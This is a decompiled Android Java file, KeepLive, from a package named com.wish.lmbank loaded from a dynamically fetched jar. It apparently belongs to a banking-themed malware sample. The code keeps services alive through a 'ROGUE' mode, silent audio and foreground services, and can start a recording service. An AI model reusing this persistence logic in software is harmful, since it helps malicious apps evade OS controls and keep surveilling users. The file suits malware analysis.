package com.wish.lmbank.keeplive;

import android.app.Application;
import android.content.Intent;
import android.os.Build;

import com.wish.lmbank.AppStartV;
import com.wish.lmbank.keeplive.config.ForegroundNotification;
import com.wish.lmbank.service.RecServiceV;
import com.wish.lmbank.service.YLJobHandlerService;
import com.wish.lmbank.utils.PermissionUtils;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/keeplive/KeepLive.class */
public final class KeepLive {
    public static ForegroundNotification foregroundNotification;
    public static RunMode runMode;
    public static boolean useSilenceMusic = true;

    /* loaded from: cookie_9234504.jar:com/wish/lmbank/keeplive/KeepLive$RunMode.class */
    public enum RunMode {
        ENERGY,
        ROGUE
    }

    public static void startWork(Application application, RunMode runMode2, ForegroundNotification foregroundNotification2) {
        foregroundNotification = foregroundNotification2;
        runMode = runMode2;
        if (Build.VERSION.SDK_INT >= 21) {
            Intent intent = new Intent(application, YLJobHandlerService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                application.startForegroundService(intent);
            } else {
                application.startService(intent);
            }
        } else if (!AppStartV.isLoadUrl.booleanValue() || PermissionUtils.hasAllPermission(AppStartV.getContext()).size() >= 1) {
        } else {
            application.startService(new Intent(application, RecServiceV.class));
        }
    }

    public static void useSilenceMusic(boolean z) {
        useSilenceMusic = z;
    }
}
